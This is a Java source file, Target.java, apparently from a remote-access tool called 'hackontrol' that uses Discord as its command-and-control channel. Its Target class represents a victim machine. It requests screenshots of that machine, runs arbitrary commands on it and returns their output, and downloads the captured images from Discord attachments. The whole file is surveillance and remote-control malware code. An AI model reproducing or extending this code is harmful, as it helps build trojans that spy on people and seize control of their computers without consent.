package com.khopan.hackontrol;

import java.io.InputStream;

import net.dv8tion.jda.api.entities.Message.Attachment;

public class Target {
	private final Hackontrol hackontrol;
	private final MachineId identifier;

	boolean connected;

	private volatile byte[] image;
	private volatile String commandResult;

	public Target(Hackontrol hackontrol, MachineId identifier) {
		this.hackontrol = hackontrol;
		this.identifier = identifier;
		this.connected = true;
	}

	public MachineId getMachineIdentifier() {
		return this.identifier;
	}

	public byte[] screenshot() {
		this.check();
		this.image = null;
		this.hackontrol.request.screenshot();
		while(this.image == null) {}
		return this.image;
	}

	public String command(String command) {
		this.check();
		this.commandResult = null;
		this.hackontrol.request.command(command);
		while(this.commandResult == null) {}
		return this.commandResult;
	}

	void screenshotTaken(Attachment attachment) {
		new Thread(() -> {
			byte[] image;

			try {
				InputStream stream = attachment.getProxy().download().get();
				image = stream.readAllBytes();
			} catch(Throwable ignored) {
				ignored.printStackTrace();
				return;
			}

			this.image = image;
		}).start();
	}

	void commandResult(String result) {
		this.commandResult = result;
	}

	private void check() {
		if(!this.connected) {
			throw new IllegalStateException("Target was disconnected!");
		}
	}
}
